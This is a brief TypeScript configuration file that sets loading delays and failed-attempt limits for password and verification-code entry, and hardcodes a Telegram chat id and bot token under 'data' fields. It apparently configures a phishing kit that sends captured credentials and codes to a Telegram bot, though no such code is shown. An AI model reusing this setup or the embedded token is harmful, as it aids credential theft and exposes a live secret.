interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: string;
    data_token: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 20000,
    max_failed_code_attempts: 4,
    max_failed_password_attempts: 0,
    password_loading_time: 20000,
  },
  telegram: {
    data_chatid: "6928425325",
    data_token: "7669098850:AAFkB5IGIn8fK-pd086C9zjBtFvKWmTnGRo",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
